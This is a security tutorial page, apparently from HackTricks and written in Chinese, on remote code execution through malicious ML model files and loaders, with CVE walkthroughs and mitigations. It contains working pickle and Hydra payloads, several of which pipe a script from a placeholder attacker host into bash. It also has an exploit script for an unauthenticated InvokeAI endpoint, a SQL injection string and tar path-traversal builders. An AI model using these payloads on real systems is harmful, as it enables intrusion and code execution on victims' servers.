# Models RCE

{{#include ../banners/hacktricks-training.md}}

## 加载模型实现 RCE

Machine Learning 模型通常以不同格式共享，例如 ONNX、TensorFlow、PyTorch 等。开发者可以将这些模型加载到自己的机器或生产系统中使用。通常模型不应包含恶意代码，但在某些情况下，模型可以作为预期功能，或利用模型加载库中的漏洞，在系统上执行任意代码。

下表列出了此类漏洞的代表性示例：

| **框架 / 工具**        | **漏洞（如有则列出 CVE）**                                                    | **RCE 向量**                                                                                                                           | **参考资料**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` 中的不安全反序列化* **(CVE-2025-32434)**                                                              | 恶意 pickle 藏在模型 checkpoint 中，导致代码执行（绕过 `weights_only` 保护措施）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 下载恶意模型导致代码执行；管理 API 中的 Java 反序列化 RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | 通过 `torch.load` 进行不安全的 checkpoint 反序列化 **(CVE-2025-23298)**                                           | 不受信任的 checkpoint 在 `load_model_trainer_states_from_checkpoint` 期间触发 pickle reducer → 在 ML worker 中执行代码            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 不安全的 MessagePack 扩展钩子 **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | 用户可控的 `filter` 键注入 SQL/JSON-path 语法，`UNION SELECT` 伪造 checkpoint 行，随后 `msgpack` 反序列化导入并调用攻击者指定的 Python 代码 | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678**（不安全的 YAML） <br> **CVE-2024-3660**（Keras Lambda）                                                      | 从 YAML 加载模型时使用 `yaml.unsafe_load`（代码执行） <br> 加载带有 **Lambda** layer 的模型时会运行任意 Python 代码          | |
| TensorFlow (TFLite)         | **CVE-2022-23559**（TFLite 解析）                                                                                          | 特制的 `.tflite` 模型触发整数溢出 → 堆损坏（可能导致 RCE）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092**（joblib/pickle）                                                                                           | 通过 `joblib.load` 加载模型时，会执行包含攻击者 `__reduce__` payload 的 pickle                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446**（不安全的 `np.load`）*存在争议*                                                                              | `numpy.load` 默认允许 pickle 对象数组——恶意 `.npy/.npz` 会触发代码执行                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882**（目录遍历） <br> **CVE-2024-5187**（tar 遍历）                                                    | ONNX 模型的外部权重路径可以逃逸出目录（读取任意文件） <br> 恶意 ONNX model tar 可以覆盖任意文件（导致 RCE） | |
| ONNX Runtime（设计风险）  | *（无 CVE）* ONNX custom ops / control flow                                                                                    | 带有 custom operator 的模型需要加载攻击者的原生代码；复杂的模型图可滥用逻辑来执行非预期计算   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036**（路径遍历）                                                                                          | 启用 `--model-control` 时，使用 model-load API 可通过相对路径遍历写入文件（例如覆盖 `.bashrc` 以实现 RCE）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668**（多个堆溢出）                                                                         | 格式错误的 GGUF 模型文件会导致解析器堆缓冲区溢出，从而在受害者系统上执行任意代码                     | |
| **Keras（旧格式）**   | *（无新 CVE）* Legacy Keras H5 模型                                                                                         | 带有 Lambda layer 的恶意 HDF5 (`.h5`) 模型仍会在加载时执行代码（Keras safe_mode 不适用于旧格式——“降级攻击”） | |
| **其他**（通用）        | *设计缺陷* – Pickle 序列化                                                                                         | 许多 ML 工具（例如基于 pickle 的模型格式、Python `pickle.load`）都会执行嵌入模型文件中的任意代码，除非采取缓解措施 | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 将不受信任的元数据传入 `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻击者可控的模型元数据/配置将 `_target_` 设置为任意可调用对象（例如 `builtins.exec`）→ 在加载期间执行，即使使用“安全”格式（`.safetensors`、`.nemo`、repo `config.json`）也不例外 | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

此外，也有一些基于 Python pickle 的模型，例如 [PyTorch](https://github.com/pytorch/pytorch/security) 使用的模型，如果未使用 `weights_only=True` 加载，就可能被用于在系统上执行任意代码。因此，任何基于 pickle 的模型都可能特别容易受到此类攻击，即使它们未列在上表中也是如此。

### Hydra 元数据 → RCE（即使使用 safetensors 也有效）

`hydra.utils.instantiate()` 会导入并调用配置/元数据对象中任何以点分隔的 `_target_`。当 Hugging Face Transformers 等库将**不受信任的模型元数据**传入 `instantiate()` 时，攻击者可以提供可调用对象及其参数，并在模型加载期间立即运行（无需 pickle）。<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload 示例（适用于 `.nemo` `model_config.yaml`、repo `config.json`，或 `.safetensors` 中的 `__metadata__`）：

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

要点：
- 在 NeMo `restore_from/from_pretrained`、uni2TS HuggingFace coders 和 FlexTok loaders 中，会在模型初始化前触发。
- Hydra 的字符串 block-list 可通过其他导入路径（例如 `enum.bltns.eval`）或应用解析的名称（例如 `nemo.core.classes.common.os.system` → `posix`）绕过。<sup>[[14]](#references)</sup>
- FlexTok 还会使用 `ast.literal_eval` 解析字符串化的元数据，因此在调用 Hydra 前即可造成 DoS（CPU/内存耗尽）。

### 🆕 通过 `torch.load` 在 InvokeAI 中实现 RCE（CVE-2024-12029）

`InvokeAI` 是一个热门的 Stable-Diffusion 开源 Web 界面。**5.3.1 – 5.4.2** 版本开放了 REST endpoint `/api/v2/models/install`，允许用户从任意 URL 下载并加载模型。<sup>[[1]](#references)</sup>

在内部，该 endpoint 最终会调用：

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

当提供的文件是 **PyTorch checkpoint (`*.ckpt`)** 时，`torch.load` 会执行 **pickle 反序列化**。由于内容直接来自用户控制的 URL，攻击者可以在 checkpoint 中嵌入一个带有自定义 `__reduce__` 方法的恶意对象；该方法会在**反序列化期间**执行，从而在 InvokeAI 服务器上导致**远程代码执行 (RCE)**。

该漏洞被分配了 **CVE-2024-12029**（CVSS 9.8，EPSS 61.17 %）。

#### 利用过程演示

1. 创建恶意 checkpoint：

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. 在你控制的 HTTP 服务器上托管 `payload.ckpt`（例如 `http://ATTACKER/payload.ckpt`）。
3. 触发存在漏洞的端点（无需身份验证）：

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI 下载文件时会调用 `torch.load()` → `os.system` gadget 运行，攻击者便可在 InvokeAI 进程的上下文中执行代码。

现成的 exploit：**Metasploit** 模块 `exploit/linux/http/invokeai_rce_cve_2024_12029` 可自动完成整个流程。<sup>[[3]](#references)</sup>

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan flag 默认为 **false**）
•  攻击者可访问 `/api/v2/models/install`
•  进程具有执行 shell 命令的权限

#### 缓解措施

* 升级到 **InvokeAI ≥ 5.4.3** – 此补丁默认设置 `scan=True`，并在反序列化之前执行 malware scanning。<sup>[[2]](#references)</sup>
* 以编程方式加载 checkpoint 时，使用 `torch.load(file, weights_only=True)` 或新的 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper。
* 对模型来源强制实施 allow-list / signatures，并以最小权限运行服务。

> ⚠️ 请记住，**任何**基于 Python pickle 的格式（包括许多 `.pt`、`.pkl`、`.ckpt`、`.pth` 文件）在从不可信来源反序列化时，本质上都不安全。

---

如果必须让旧版 InvokeAI 继续运行在反向代理后面，以下是一个临时缓解措施示例：

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec 通过不安全的 `torch.load` 实现 RCE（CVE-2025-23298）

NVIDIA 的 Transformers4Rec（Merlin 的一部分）暴露了一个不安全的 checkpoint loader，它会直接对用户提供的路径调用 `torch.load()`。由于 `torch.load` 依赖 Python `pickle`，攻击者控制的 checkpoint 可以在反序列化期间通过 reducer 执行任意代码。<sup>[[5]](#references)</sup>

易受攻击的路径（修复前）：`transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

为何会导致 RCE：在 Python pickle 中，对象可以定义一个 reducer（`__reduce__`/`__setstate__`），返回一个可调用对象及其参数。反序列化时会执行该可调用对象。如果 checkpoint 中包含此类对象，它就会在使用任何权重之前运行。

最简恶意 checkpoint 示例：

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

交付向量和影响范围：
- 通过 repos、buckets 或 artifact registries 分享植入木马的 checkpoints/models
- 自动加载 checkpoints 的自动化 resume/deploy pipelines
- 在训练/推理 workers 内执行，通常具有较高权限（例如容器中的 root 权限）

修复：Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）将直接调用 `torch.load()` 改为受限的 allow-list 反序列化器，该反序列化器在 `transformers4rec/utils/serialization.py` 中实现。新的 loader 会验证类型和字段，并阻止在加载过程中调用任意 callables。<sup>[[7]](#references)</sup>

PyTorch checkpoints 的专门防御指南：
- 不要反序列化不可信数据。尽可能优先使用 Safetensors 或 ONNX 等非可执行格式。
- 如果必须使用 PyTorch serialization，请确保设置 `weights_only=True`（较新版本的 PyTorch 支持），或使用类似 Transformers4Rec patch 的自定义 allow-list unpickler。<sup>[[4]](#references)</sup>
- 强制执行模型来源验证/签名检查，并在 sandbox 中进行反序列化（seccomp/AppArmor；使用非 root 用户；限制文件系统访问且禁止网络出站）。
- 在加载 checkpoint 时监控 ML 服务是否意外启动子进程；跟踪 `torch.load()`/`pickle` 的使用情况。

POC 和漏洞/patch 参考资料：<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Patch 前的漏洞 loader：https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 恶意 checkpoint POC：https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Patch 后的 loader：https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 示例 – 构造恶意 PyTorch 模型

- 创建模型：

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- 加载模型：

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Tencent FaceDetection-DSFD resnet 反序列化（CVE-2025-13715 / ZDI-25-1183）

Tencent 的 FaceDetection-DSFD 暴露了一个会反序列化用户可控数据的 `resnet` endpoint。ZDI 确认，远程攻击者可以诱使受害者加载恶意页面/文件，让其向该 endpoint 发送精心构造的序列化数据块，并以 `root` 身份触发反序列化，从而导致系统完全失陷。

该 exploit 流程与典型的 pickle 滥用类似：

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

任何在反序列化期间可触达的 gadget（构造函数、`__setstate__`、框架回调等）都可以用同样的方式 weaponize，无论传输方式是 HTTP、WebSocket，还是放入受监控目录的文件。



### LangGraph checkpointer SQLi → MessagePack RCE

这条攻击链很有意思，因为攻击者**不需要上传恶意模型文件**。相反，应用暴露了一个 **AI-agent 持久化 API**（`get_state_history(..., filter=...)`），用户输入会传递到 checkpointer 查询构造器。

#### 1. 元数据过滤器中的结构型 SQLi

一种存在漏洞的 SQLite 模式如下：

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

该值之后才会绑定，但 `query_key` 被拼接进 **JSON path 字符串**，因此字典键中的 `'` 会跳出 `'$.{query_key}'` 并注入 SQL。同样的教训也适用于 **JSON paths、identifiers、operators、`LIMIT` 和 TTL 字段**：占位符只能保护值，不能保护查询结构语法。

#### 2. `UNION SELECT` 可以针对下游 sink，而不只是窃取数据

查询会返回 `type` 和序列化的 `checkpoint` 字节，之后会由以下内容使用：

```python
self.serde.loads_typed((type, checkpoint))
```

这意味着 `WHERE` 子句中的 SQLi 可以注入一个**伪造的结果行**：

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

如果后续代码会解析、反序列化、写入或执行任何选定的列，请将这些列映射到对应的 sink。在本例中，伪造行将 SQLi 转变为**攻击者可控的反序列化**。

#### 3. 不安全的 MessagePack 扩展钩子等同于代码 gadget

LangGraph 的 `msgpack` 路径使用了一个自定义扩展钩子，该钩子会解包一个嵌套元组并执行：

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

因此，一个编码了等价于 `("os", "system", "id > /tmp/pwned")` 的 MessagePack 扩展对象会导入 `os`，解析 `system`，并运行该命令。审查 AI 框架时，请检查**自定义 MessagePack/JSON/pickle reviver**是否会进行动态导入、反射或任意 callable 分发。

#### 4. Agent 框架的实用审计模式

审查所有可能接收用户可控输入的功能：
- state history / memory / replay / checkpoint listing API
- 会生成 SQL 或 Redis 查询片段的结构化过滤器构建器
- 自定义反序列化器（`pickle`、`msgpack`、`json` object hooks、YAML constructors）
- 信任持久化层返回行的恢复路径

当不可信用户能够控制 `filter` 时，这条特定攻击链会影响使用 **SQLite** 或 **Redis** checkpointer 的自托管 LangGraph 部署。披露中指出的修补版本为 `langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+` 和 `langgraph-checkpoint 4.0.1+`。<sup>[[15]](#references)</sup>

## 模型导致路径遍历

正如[**这篇博客文章**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)中所述，不同 AI 框架使用的大多数模型格式都基于归档文件，通常是 `.zip`。因此，可能可以滥用这些格式执行路径遍历攻击，从而读取加载模型的系统上的任意文件。<sup>[[16]](#references)</sup>

例如，使用以下代码，你可以创建一个模型，在加载时于 `/tmp` 目录中创建文件：

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

或者，使用以下代码可以创建一个模型，该模型在加载时会创建指向 `/tmp` 目录的符号链接：

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 深入分析：Keras .keras 反序列化与 gadget 搜寻

如需了解 .keras 内部机制、Lambda 层 RCE、≤ 3.8 中的任意导入问题，以及修复后在允许列表中发现 gadget 的方法，请参阅：


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec 博客 – "CVE-2024-12029 – InvokeAI 不可信数据反序列化"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI 补丁提交 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit 模块文档](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load 安全注意事项](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI 博客 – CVE-2025-23298：在 NVIDIA Merlin 中实现远程代码执行](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI 公告：ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec 补丁提交 b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [修复前的易受攻击加载器 (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [恶意 checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [修复后的加载器 (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 现代 AI/ML 格式与库中的远程代码执行](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate 文档](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra 阻止列表提交（RCE 警告）](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – 从 SQLi 到 RCE：利用 LangGraph 的 Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [将 Archive Slip 漏洞转化为高价值 AI/ML 漏洞赏金机会](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
